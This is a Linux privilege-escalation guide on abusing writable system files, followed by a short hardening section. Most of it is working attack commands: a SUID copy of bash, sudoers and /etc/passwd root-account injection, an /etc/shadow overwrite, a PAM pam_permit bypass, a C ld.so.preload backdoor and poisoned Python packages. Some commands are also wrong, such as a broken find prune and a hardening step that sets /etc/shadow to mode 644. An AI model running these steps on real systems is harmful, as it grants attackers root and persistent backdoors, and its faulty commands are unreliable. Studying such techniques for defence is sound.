## Writable System Files for Privilege Escalation

System files that are **writable by non-root users** represent a critical privilege escalation vector. When root executes scripts or reads configuration files that lower-privileged users can modify, attackers can inject malicious code, alter system behavior, or gain root access. This is often overlooked during system hardening.

---

### 1. Understanding the Attack Surface

**Core Concept**: Any system file that root uses and a non-root user can modify is a potential escalation path. The exploitation typically involves:
1. **Scripts**: Inject malicious code that root executes
2. **Configuration files**: Alter settings to execute arbitrary commands
3. **Log files**: Manipulate to trigger command execution
4. **Library files**: Hijack function calls
5. **Binary files**: Replace or modify executables

**Why This Works**: Root trusts system files by default. If a file is writable, root will execute/modify it without checking permissions, executing attacker-controlled code.

---

### 2. Enumeration: Finding Writable System Files

**Comprehensive Search**:
```bash
# Find world-writable files in system directories
find / -type f -perm -0002 -path /proc -prune -o -exec ls -la {} \; 2>/dev/null

# Find files writable by current user
find / -type f -writable ! -user root -exec ls -la {} \; 2>/dev/null

# Focus on critical system directories
find /bin /sbin /usr/bin /usr/sbin /etc /lib /usr/lib -type f -writable 2>/dev/null

# Find world-writable scripts
find / -type f -name "*.sh" -perm -0002 -exec ls -la {} \; 2>/dev/null
find / -type f -name "*.py" -perm -0002 -exec ls -la {} \; 2>/dev/null

# Find writable files in cron directories
find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null

# Check for writable configuration files
find /etc -type f -writable ! -user root 2>/dev/null | grep -v "/etc/passwd\|/etc/shadow"
```

**Automated Tools**:
```bash
# LinPEAS will highlight writable files
./linpeas.sh | grep -E "Writable|Writeable" -A 5

# Manual check with colorized output
find / -type f -writable 2>/dev/null | while read file; do
    echo -e "\033[31m[WRITABLE]\033[0m $file"
done
```

---

### 3. Writable Scripts (.sh, .py, .pl, .rb)

#### A. System Scripts in PATH

If a script in `/bin`, `/usr/bin`, or `/usr/local/bin` is writable, root might execute it.

**Exploitation**:
```bash
# Find writable scripts in PATH
for dir in $(echo $PATH | tr ':' ' '); do
    find $dir -type f -writable -exec ls -la {} \; 2>/dev/null
done

# Example: /usr/local/bin/backup.sh is world-writable
echo '#!/bin/bash
chmod +s /bin/bash
cp /bin/bash /tmp/shell
chmod +s /tmp/shell' >> /usr/local/bin/backup.sh

# Wait for root to execute it, then:
/tmp/shell -p  # Root shell
```

**Note**: Even if the script isn't directly run by root, it might be:
- Called from a cron job
- Included (`source`) in another script
- Used during system startup
- Called by other system services

---

#### B. Writable Init Scripts

System initialization scripts in `/etc/init.d/`, `/etc/rc.d/`, or systemd unit files.

**Exploitation**:
```bash
# Check writable init scripts
find /etc/init.d/ -type f -writable 2>/dev/null

# Modify service script
echo '#!/bin/sh
chmod +s /bin/bash' >> /etc/init.d/malicious_service

# Trigger service restart or wait for reboot
systemctl restart malicious_service
# Or wait for system startup
```

**Systemd Services**:
```bash
# Find writable service files
find /etc/systemd/system/ -name "*.service" -writable 2>/dev/null
find /lib/systemd/system/ -name "*.service" -writable 2>/dev/null

# Modify service
vim /etc/systemd/system/some.service
# Add: ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'

# Reload and restart
systemctl daemon-reload
systemctl restart some.service
```

---

### 4. Writable Configuration Files

#### A. /etc/sudoers (Most Critical)

If `/etc/sudoers` is writable, escalate immediately.

**Exploitation**:
```bash
# Check permissions
ls -la /etc/sudoers
# Output: -rw-rw-r-- 1 root root (writable by group)

# Add yourself to sudoers (needs proper syntax)
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
# Or use visudo to validate
sudo bash  # Direct root
```

**Note**: Modern systems have `/etc/sudoers.d/` which might be more permissive:
```bash
# Check directory permissions
ls -ld /etc/sudoers.d/
# If writable:
echo 'user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/user
```

---

#### B. /etc/passwd and /etc/shadow

If writable, add a new root user or change root password.

**Exploitation**:
```bash
# Generate password hash
openssl passwd -1 -salt abc password123
# Output: $1$abc$0J/2wzDqgVX6j.GL5hH3X.

# Add new root user
echo 'hacker:$1$abc$0J/2wzDqgVX6j.GL5hH3X.:0:0:Hacker:/root:/bin/bash' >> /etc/passwd

# Now: su hacker (password: password123)
```

**/etc/shadow**:
```bash
# If writable, change root password hash
# Backup original
cp /etc/shadow /tmp/shadow.bak
# Replace root's hash with your own
echo 'root:$1$abc$0J/2wzDqgVX6j.GL5hH3X.:19000:0:99999:7:::' > /etc/shadow
# Now: su root (password: password123)
```

---

#### C. PAM Configuration (/etc/pam.d/)

PAM modules control authentication. A writable PAM config can bypass authentication.

**Exploitation**:
```bash
# Check permissions
ls -la /etc/pam.d/common-auth

# Modify to always succeed
echo 'auth sufficient pam_permit.so' >> /etc/pam.d/common-auth
echo 'auth required pam_unix.so' >> /etc/pam.d/common-auth

# Now any login works
```

---

#### D. SSH Configuration (/etc/ssh/sshd_config)

Enable root login, password authentication, or run custom commands.

**Exploitation**:
```bash
# Enable root login
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config

# Force command on login
echo 'ForceCommand /bin/bash -c "chmod +s /bin/bash && /bin/bash"' >> /etc/ssh/sshd_config

# Restart SSH
systemctl restart ssh
```

---

#### E. /etc/ld.so.conf and /etc/ld.so.conf.d/

Controls library search paths. Adding a directory can hijack shared libraries.

**Exploitation**:
```bash
# Add malicious library directory
echo '/tmp/malicious_libs' >> /etc/ld.so.conf
ldconfig

# Create malicious libc
gcc -shared -fPIC -o /tmp/malicious_libs/libc.so.6 malicious.c
# Any program using libc will load our malicious library
```

**Risk Level**: Extremely high - affects almost all system processes.

---

### 5. Writable Profile and Environment Files

#### A. /etc/profile, /etc/bash.bashrc, /etc/profile.d/

Global shell initialization scripts executed for every login (including root).

**Exploitation**:
```bash
# Check permissions
ls -la /etc/profile
# If writable:

echo '#!/bin/bash
chmod +s /bin/bash
rm -f /tmp/backdoor
cp /bin/bash /tmp/backdoor
chmod +s /tmp/backdoor' >> /etc/profile

# Wait for root login, or trigger:
su - root
# /tmp/backdoor -p gives root shell
```

**Bashrc Example**:
```bash
echo 'alias sudo="chmod +s /bin/bash"' >> /etc/bash.bashrc
# When root types sudo, it executes instead
```

---

#### B. User-specific Profile Files

If you can write to root's home directory.

**Exploitation**:
```bash
# If root's .bashrc is writable
echo 'chmod +s /bin/bash' >> /root/.bashrc

# Wait for root login or su - root
```

**Note**: Root's home is usually `/root` with strict permissions (750/700). But misconfigurations happen.

---

### 6. Writable Directories with Dynamic Loading

#### A. /etc/ld.so.preload

Preloads libraries **before** any program starts. One of the most dangerous writable files.

**Exploitation**:
```bash
# Create malicious library
cat > /tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
__attribute__((constructor)) void init() {
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -shared -fPIC /tmp/backdoor.c -o /tmp/backdoor.so

# Add to ld.so.preload
echo '/tmp/backdoor.so' > /etc/ld.so.preload

# Next SUID program executed gives root shell
sudo ls  # Or any SUID binary
```

**Persistent Backdoor**:
```bash
# Add to /etc/ld.so.preload for permanent backdoor
echo '/tmp/backdoor.so' >> /etc/ld.so.preload
```

---

#### B. Python/Perl/Ruby Site Packages

If system site-packages directories are writable.

**Exploitation - Python**:
```bash
# Find writable site-packages
find /usr/lib/python* -type d -writable 2>/dev/null

# Override system module
cat > /usr/lib/python3/dist-packages/requests/__init__.py << 'EOF'
import os
os.system("chmod +s /bin/bash")
EOF

# Any Python script using 'requests' executes as root
# If system service uses it, privilege escalation
```

---

### 7. Writable Log Files (Command Injection)

Some log files are processed by root scripts. Injecting log entries can lead to command injection.

**Example - /var/log/auth.log**:
```bash
# If log file is processed by a cron script:
# Cron script might grep logs and run commands

# Inject command
echo 'malicious_command' >> /var/log/auth.log
# Cron script executes the log content
```

**Practical Scenario**:
```bash
# Cron script doing: grep "ERROR" /var/log/app.log | while read line; do $line; done
# Attacker writes to /var/log/app.log:
echo 'chmod +s /bin/bash' >> /var/log/app.log
# Cron executes it as root
```

---

### 8. SUID Binary with Writable Library Dependencies

If an SUID binary uses a shared library that's writable.

**Exploitation**:
```bash
# Find SUID binary
find / -perm -4000 -type f 2>/dev/null

# Check its library dependencies
ldd /usr/bin/suid_binary

# If a library is writable:
vim /lib/libssl.so.1.1
# Add malicious code in library constructor
```

**Caveat**: Libraries often get replaced during updates. Persistent backdoor requires more work.

---

### 9. Writable Kernel Modules

If kernel modules (`.ko` files) are writable, root can be escalated.

**Exploitation**:
```bash
# Find writable kernel modules
find /lib/modules/ -name "*.ko" -writable 2>/dev/null

# Create malicious module
# Or modify existing module to execute code on load

# Load modified module
insmod /path/to/malicious_module.ko
```

---

### 10. Writable Devices and Special Files

#### A. /dev/mem (Writable Memory)

If writable, can modify kernel memory.

**Exploitation**:
```bash
# Check permissions
ls -la /dev/mem
# If writable, use memory manipulation tools
```

#### B. /dev/shm

Writable shared memory that root scripts might use.

**Exploitation**:
```bash
# Cron script reads from /dev/shm/tempfile
echo 'chmod +s /bin/bash' > /dev/shm/tempfile
# Cron executes content
```

---

### 11. Practical Exploitation Workflow

**Step 1: Identify All Writable System Files**:
```bash
# Comprehensive enumeration
find / -type f -writable ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | tee writable_files.txt

# Filter for critical files
grep -E "/etc/|/bin/|/usr/bin/|/usr/sbin/|/lib/|/usr/lib/|/var/spool/cron|/etc/cron" writable_files.txt | tee critical_writable.txt
```

**Step 2: Prioritize Based on Likely Root Execution**:
```bash
# Check cron files (run as root)
find /etc/cron* -type f -writable 2>/dev/null
# Check init scripts (run at boot or service start)
find /etc/init.d/ -type f -writable 2>/dev/null
# Check systemd units
find /etc/systemd/system -name "*.service" -writable 2>/dev/null
# Check PATH scripts
for dir in $(echo $PATH | tr ':' ' '); do find $dir -type f -writable 2>/dev/null; done
```

**Step 3: Determine Execution Context**:
```bash
# Search for references to the file in root-owned scripts
grep -r "writable_script.sh" /etc/ /var/spool/cron/ 2>/dev/null

# Check if file is used by any service
systemctl list-dependencies | grep writable_script
```

**Step 4: Inject Payload**:
```bash
# For scripts: append shell escape
echo '#!/bin/bash
chmod +s /bin/bash' >> /path/to/writable_script

# For configs: add malicious directives
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/user
```

**Step 5: Trigger Execution**:
```bash
# Wait for cron
# Restart service
systemctl restart servicename
# Trigger via other user activity
# Force reboot (if script is startup)
```

**Step 6: Verify Escalation**:
```bash
# Check if /bin/bash has SUID bit
ls -la /bin/bash
# Execute with -p to preserve privileges
/bin/bash -p
# Or use backup shell
/tmp/backdoor -p
```

---

### 12. Defensive Measures

**For System Administrators**:

1. **Regular Audits**:
   ```bash
   # Daily scan for new writable files
   find /etc /bin /usr/bin /sbin /usr/sbin /lib /usr/lib -type f -writable ! -user root -ls 2>/dev/null
   
   # Integrate into monitoring
   ```

2. **Strict Permissions**:
   ```bash
   # Reset permissions on system directories
   chmod 755 /etc /bin /usr/bin /sbin /usr/sbin /lib /usr/lib
   chmod 644 /etc/passwd /etc/shadow /etc/sudoers
   chmod 644 /etc/crontab /etc/ld.so.conf
   
   # Remove world-writable permissions
   find / -type f -perm -0002 -exec chmod o-w {} \;
   ```

3. **Immutable Files**:
   ```bash
   # Protect critical files
   chattr +i /etc/passwd
   chattr +i /etc/shadow
   chattr +i /etc/sudoers
   chattr +i /etc/crontab
   # Only root can modify with chattr -i
   ```

4. **Filesystem Mount Options**:
   ```bash
   # Mount /tmp and /var/tmp with noexec,nosuid
   mount -o remount,noexec,nosuid /tmp
   mount -o remount,noexec,nosuid /var/tmp
   ```

5. **Integrity Checking**:
   ```bash
   # Use AIDE or Tripwire
   aide --init
   aide --check
   
   # Debian/Ubuntu: debsums
   debsums -c  # Check for modified files
   ```

6. **SELinux/AppArmor**:
   ```bash
   # Enable SELinux to restrict file access
   setenforce 1
   # Or AppArmor
   aa-enforce /etc/apparmor.d/*
   ```

7. **Monitor Write Attempts**:
   ```bash
   # Auditd rules for file writes
   auditctl -w /etc/ -p wa -k system_config
   auditctl -w /bin/ -p wa -k bin_changes
   auditctl -w /usr/bin/ -p wa -k usr_bin_changes
   ```

8. **Secure Cron Directories**:
   ```bash
   # Restrict cron directories
   chmod 755 /etc/cron.d
   chmod 755 /etc/cron.hourly
   chmod 755 /etc/cron.daily
   chmod 755 /etc/cron.weekly
   chmod 755 /etc/cron.monthly
   ```
